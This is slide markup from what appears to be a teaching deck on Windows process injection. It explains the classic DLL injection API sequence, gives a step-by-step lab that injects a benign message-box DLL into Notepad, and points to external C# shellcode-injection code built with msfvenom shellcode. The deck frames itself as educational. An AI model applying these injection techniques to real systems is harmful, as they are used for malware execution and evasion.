                <a:solidFill>
                  <a:srgbClr val="F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t> — Opens the target process with sufficient permissions</a:t>
            </a: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en-US" sz="2000" b="1" i="0" u="none" strike="noStrike" cap="none" normalizeH="0" baseline="0" dirty="0" err="1">
                <a:ln>
                  <a:noFill/>
                </a:ln>
                <a:solidFill>
                  <a:srgbClr val="F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t>VirtualAllocEx</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="0" lang="en-US" altLang="en-US" sz="2000" b="0" i="0" u="none" strike="noStrike" cap="none" normalizeH="0" baseline="0" dirty="0">
                <a:ln>
                  <a:noFill/>
                </a:ln>
                <a:solidFill>
                  <a:srgbClr val="F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t> — Allocates memory inside the target process to store the DLL path</a:t>
            </a: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en-US" sz="2000" b="1" i="0" u="none" strike="noStrike" cap="none" normalizeH="0" baseline="0" dirty="0" err="1">
                <a:ln>
                  <a:noFill/>
                </a:ln>
                <a:solidFill>
                  <a:srgbClr val="F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t>WriteProcessMemory</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="0" lang="en-US" altLang="en-US" sz="2000" b="0" i="0" u="none" strike="noStrike" cap="none" normalizeH="0" baseline="0" dirty="0">
                <a:ln>
                  <a:noFill/>
                </a:ln>
                <a:solidFill>
                  <a:srgbClr val="F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t> — Writes the DLL path string into the allocated memory</a:t>
            </a:r>
          </a:p>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kumimoji="0" lang="en-US" altLang="en-US" sz="2000" b="1" i="0" u="none" strike="noStrike" cap="none" normalizeH="0" baseline="0" dirty="0" err="1">
                <a:ln>
                  <a:noFill/>
                </a:ln>
                <a:solidFill>
                  <a:srgbClr val="F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t>CreateRemoteThread</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="0" lang="en-US" altLang="en-US" sz="2000" b="0" i="0" u="none" strike="noStrike" cap="none" normalizeH="0" baseline="0" dirty="0">
                <a:ln>
                  <a:noFill/>
                </a:ln>
                <a:solidFill>
                  <a:srgbClr val="F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t> — Creates a new thread in the target process that calls </a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="0" lang="en-US" altLang="en-US" sz="1400" b="0" i="0" u="none" strike="noStrike" cap="none" normalizeH="0" baseline="0" dirty="0" err="1">
                <a:ln>
                  <a:noFill/>
                </a:ln>
                <a:solidFill>
                  <a:srgbClr val="F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Menlo"/>
              </a:rPr>
              <a:t>LoadLibraryA</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="0" lang="en-US" altLang="en-US" sz="2000" b="0" i="0" u="none" strike="noStrike" cap="none" normalizeH="0" baseline="0" dirty="0">
                <a:ln>
                  <a:noFill/>
                </a:ln>
                <a:solidFill>
                  <a:srgbClr val="F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t> with the DLL path as its argument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indent="0">
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr lang="en-US" sz="2000" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr lang="en-US" sz="2000" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Rectangle 1">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{D79861D4-082C-4AF3-04D2-919B61755401}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="0" y="17988"/>
            <a:ext cx="0" cy="421224"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="15151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6979" tIns="142830" rIns="-26979"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CA66EF4A-FE32-207A-34AD-8C8695DEF827}"/>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5C273BE0-D827-1D8C-44DF-9369B41995E5}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="0" y="-54124"/>
            <a:ext cx="0"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6979" tIns="142830" rIns="-26979" bIns="14283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123479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395787-E14D-83E9-4271-B1C4466C0DCE}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="0" y="0"/>
            <a:ext cx="11976410" cy="6858000"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:noAutofit/>
          </a:bodyPr>
          <a:lstStyle/>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 Process-Injection. (Classic DLL Injection) Method 1</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b="1" i="1" kern="100" dirty="0">
                <a:effectLst/>
                <a:latin typeface="Aptos" panose="020B0004020202020204" pitchFamily="34" charset="0"/>
                <a:ea typeface="Aptos" panose="020B0004020202020204" pitchFamily="34" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>Inject a DLL into a running Notepad process.</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Step 1: Start the Victim</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Open a normal Command Prompt and run:</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notepad.exe</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Keep this Notepad window open.</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Step 2: Create a Test DLL (Payload)</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In your Developer Command Prompt, create payload.:</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#include &lt;</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="1" kern="100" dirty="0" err="1">
                <a:effectLst/>
                <a:latin typeface="Aptos" panose="020B0004020202020204" pitchFamily="34" charset="0"/>
                <a:ea typeface="Aptos" panose="020B0004020202020204" pitchFamily="34" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>windows.h</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&gt;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BOOL APIENTRY </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="1" kern="100" dirty="0" err="1">
                <a:effectLst/>
                <a:latin typeface="Aptos" panose="020B0004020202020204" pitchFamily="34" charset="0"/>
                <a:ea typeface="Aptos" panose="020B0004020202020204" pitchFamily="34" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>DllMain</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(HMODULE </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="1" kern="100" dirty="0" err="1">
                <a:effectLst/>
                <a:latin typeface="Aptos" panose="020B0004020202020204" pitchFamily="34" charset="0"/>
                <a:ea typeface="Aptos" panose="020B0004020202020204" pitchFamily="34" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>hModule</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 DWORD reason, LPVOID </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="1" kern="100" dirty="0" err="1">
                <a:effectLst/>
                <a:latin typeface="Aptos" panose="020B0004020202020204" pitchFamily="34" charset="0"/>
                <a:ea typeface="Aptos" panose="020B0004020202020204" pitchFamily="34" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>lpReserved</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    if (reason == DLL_PROCESS_ATTACH)</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b="1" kern="100" dirty="0" err="1">
                <a:effectLst/>
                <a:latin typeface="Aptos" panose="020B0004020202020204" pitchFamily="34" charset="0"/>
                <a:ea typeface="Aptos" panose="020B0004020202020204" pitchFamily="34" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>MessageBoxA</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(NULL, "Injected Successfully!", "Hack", MB_OK);</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    return TRUE;</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US" sz="2000" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Rectangle 1">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{95618CEB-3F65-CC95-9686-B48E1EB0280D}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="0" y="-198349"/>
            <a:ext cx="65" cy="853898"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="15151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85660" rIns="0" bIns="2856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E47F2906-F79F-9157-9764-DBBCDAEAC1E9}"/>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9789039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889C73-13AE-76BC-C54C-808218BA62D1}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="0" y="0"/>
            <a:ext cx="12192000" cy="6858000"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit fontScale="77500" lnSpcReduction="20000"/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" marR="0" indent="0">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="800"/>
              </a:spcAft>
              <a:buNone/>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Compile it:</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cl /LD payload.</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You now have payload.dll. Note its full path (e.g., C:\Users\YourName\payload.dll).</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Step 3: Update the Injector Code</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Open Process-Injection. and find this line:</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LPCSTR </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2800" b="1" kern="100" dirty="0" err="1">
                <a:effectLst/>
                <a:latin typeface="Aptos" panose="020B0004020202020204" pitchFamily="34" charset="0"/>
                <a:ea typeface="Aptos" panose="020B0004020202020204" pitchFamily="34" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>DllPath</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2800" b="1" kern="100" dirty="0">
                <a:effectLst/>
                <a:latin typeface="Aptos" panose="020B0004020202020204" pitchFamily="34" charset="0"/>
                <a:ea typeface="Aptos" panose="020B0004020202020204" pitchFamily="34" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t> = "C:\\path\\to\\your.dll";</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Replace it with the actual path to your payload.dll:</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LPCSTR </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2800" b="1" kern="100" dirty="0" err="1">
                <a:effectLst/>
                <a:latin typeface="Aptos" panose="020B0004020202020204" pitchFamily="34" charset="0"/>
                <a:ea typeface="Aptos" panose="020B0004020202020204" pitchFamily="34" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>DllPath</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2800" b="1" kern="100" dirty="0">
                <a:effectLst/>
                <a:latin typeface="Aptos" panose="020B0004020202020204" pitchFamily="34" charset="0"/>
                <a:ea typeface="Aptos" panose="020B0004020202020204" pitchFamily="34" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t> = "C:\\Users\\YourName\\payload.dll";</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Save the file.</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Step 4: Compile the Injector</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cl /</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2800" b="1" kern="100" dirty="0" err="1">
                <a:effectLst/>
                <a:latin typeface="Aptos" panose="020B0004020202020204" pitchFamily="34" charset="0"/>
                <a:ea typeface="Aptos" panose="020B0004020202020204" pitchFamily="34" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>EHsc</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2800" b="1" kern="100" dirty="0">
                <a:effectLst/>
                <a:latin typeface="Aptos" panose="020B0004020202020204" pitchFamily="34" charset="0"/>
                <a:ea typeface="Aptos" panose="020B0004020202020204" pitchFamily="34" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t> Process-Injection.</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i="1" kern="100" dirty="0">
                <a:effectLst/>
                <a:latin typeface="Aptos" panose="020B0004020202020204" pitchFamily="34" charset="0"/>
                <a:ea typeface="Aptos" panose="020B0004020202020204" pitchFamily="34" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>(MinGW alternative: </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2800" b="1" kern="100" dirty="0">
                <a:effectLst/>
                <a:latin typeface="Aptos" panose="020B0004020202020204" pitchFamily="34" charset="0"/>
                <a:ea typeface="Aptos" panose="020B0004020202020204" pitchFamily="34" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>g++ Process-Injection. -o Process-Injection.exe -m64</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2800" b="1" i="1" kern="100" dirty="0">
                <a:effectLst/>
                <a:latin typeface="Aptos" panose="020B0004020202020204" pitchFamily="34" charset="0"/>
                <a:ea typeface="Aptos" panose="020B0004020202020204" pitchFamily="34" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>)</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9042877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4DFF76-8849-FD86-B333-6F4FF826A285}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="116114" y="0"/>
            <a:ext cx="12075886" cy="6858000"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle/>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Step 5: Run the Injector</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800"/>
              </a:spcAft>
              <a:buSzPts val="1000"/>
              <a:buNone/>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Right-click Process-Injection.exe → Run as administrator.</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800"/>
              </a:spcAft>
              <a:buSzPts val="1000"/>
              <a:buNone/>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The console will show:</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DLL injected successfully!</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Step 6: Verify</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800"/>
              </a:spcAft>
              <a:buSzPts val="1000"/>
              <a:buNone/>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Immediate result: A </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="1" kern="100" dirty="0" err="1">
                <a:effectLst/>
                <a:latin typeface="Aptos" panose="020B0004020202020204" pitchFamily="34" charset="0"/>
                <a:ea typeface="Aptos" panose="020B0004020202020204" pitchFamily="34" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>MessageBox</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 pops up on your screen saying "Injected Successfully!".</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nSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="800"/>
              </a:spcAft>
              <a:buSzPts val="1000"/>
              <a:buNone/>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Process Hacker: Open Process Hacker → right-click notepad.exe → Properties → Modules tab. payload.dll is listed</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2000" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="27326650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1" y="0"/>
            <a:ext cx="12191935" cy="6858000"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" marR="0" indent="0">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="800"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1900" b="1" kern="100" dirty="0">
                <a:effectLst/>
                <a:latin typeface="Aptos" panose="020B0004020202020204" pitchFamily="34" charset="0"/>
                <a:ea typeface="Aptos" panose="020B0004020202020204" pitchFamily="34" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>C# Implementation — Shellcode Injection</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="19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00000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="800"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1900" kern="100" dirty="0">
                <a:effectLst/>
                <a:latin typeface="Aptos" panose="020B0004020202020204" pitchFamily="34" charset="0"/>
                <a:ea typeface="Aptos" panose="020B0004020202020204" pitchFamily="34" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>This C# example injects raw shellcode into a running process using P/Invoke to call Windows API functions. The shellcode (generated with </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1900" kern="100" dirty="0" err="1">
                <a:effectLst/>
                <a:latin typeface="Aptos" panose="020B0004020202020204" pitchFamily="34" charset="0"/>
                <a:ea typeface="Aptos" panose="020B0004020202020204" pitchFamily="34" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>msfvenom</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1900" kern="100" dirty="0">
                <a:effectLst/>
                <a:latin typeface="Aptos" panose="020B0004020202020204" pitchFamily="34" charset="0"/>
                <a:ea typeface="Aptos" panose="020B0004020202020204" pitchFamily="34" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>) is written to the target process memory and executed via a remote thread.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1900" dirty="0"/>
              <a:t>Follow the link to get the code</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1900" dirty="0">
                <a:hlinkClick r:id="rId2"/>
              </a:rPr>
              <a:t> https://github.com/umarniazafrid/Process-Injection.cpp/blob/main/Shellcode%20Injection</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1900" dirty="0"/>
              <a:t> </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1900" dirty="0"/>
              <a:t>Explanation</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1900" dirty="0">
                <a:hlinkClick r:id="rId3"/>
              </a:rPr>
              <a:t>https://github.com/umarniazafrid/Process-Injection.cpp/blob/main/Shellcode%20Injection%20Explanation</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1900" dirty="0"/>
              <a:t>  </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1900" b="1" i="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t>How it works:</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1900" b="0" i="0" dirty="0">
              <a:solidFill>
                <a:srgbClr val="F9FAFB"/>
              </a:solidFill>
              <a:effectLst/>
              <a:latin typeface="quote-cjk-patch"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr algn="l">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:buFont typeface="+mj-lt"/>
              <a:buAutoNum type="arabicPeriod"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1900" b="1" i="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t>OpenProcess</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1900" b="0" i="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t> — Opens the target process</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:buFont typeface="+mj-lt"/>
              <a:buAutoNum type="arabicPeriod"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1900" b="1" i="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t>VirtualAllocEx</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1900" b="0" i="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t> — Allocates memory inside the target process</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:buFont typeface="+mj-lt"/>
              <a:buAutoNum type="arabicPeriod"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1900" b="1" i="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t>WriteProcessMemory</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1900" b="0" i="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t> — Writes the shellcode payload into the allocated memory</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:buFont typeface="+mj-lt"/>
              <a:buAutoNum type="arabicPeriod"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1900" b="1" i="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t>VirtualProtectEx</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1900" b="0" i="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t> — Changes memory protection to allow execution</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:buFont typeface="+mj-lt"/>
              <a:buAutoNum type="arabicPeriod"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1900" b="1" i="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t>CreateRemoteThread</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1900" b="0" i="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t> — Creates a thread in the target process that starts at the shellcode address</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0" indent="0">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr lang="en-US" sz="1900" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="30692783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0" y="190500"/>
            <a:ext cx="12192000" cy="6667500"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr kumimoji="0" lang="en-US" altLang="en-US" sz="2000" b="1" i="0" u="none" strike="noStrike" cap="none" normalizeH="0" baseline="0" dirty="0">
                <a:ln>
                  <a:noFill/>
                </a:ln>
                <a:solidFill>
                  <a:srgbClr val="F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t>Important Notes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F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t>Both examples are </a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="0" lang="en-US" altLang="en-US" sz="2000" b="1" i="0" u="none" strike="noStrike" cap="none" normalizeH="0" baseline="0" dirty="0">
                <a:ln>
                  <a:noFill/>
                </a:ln>
                <a:solidFill>
                  <a:srgbClr val="F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t>proofs of concept</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="0" lang="en-US" altLang="en-US" sz="2000" b="0" i="0" u="none" strike="noStrike" cap="none" normalizeH="0" baseline="0" dirty="0">
                <a:ln>
                  <a:noFill/>
                </a:ln>
                <a:solidFill>
                  <a:srgbClr val="F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t> for educational and research purposes only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err="1">
                <a:ln>
                  <a:noFill/>
                </a:ln>
                <a:solidFill>
                  <a:srgbClr val="F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t>OpenProcess</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="0" lang="en-US" altLang="en-US" sz="2000" b="0" i="0" u="none" strike="noStrike" cap="none" normalizeH="0" baseline="0" dirty="0">
                <a:ln>
                  <a:noFill/>
                </a:ln>
                <a:solidFill>
                  <a:srgbClr val="F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
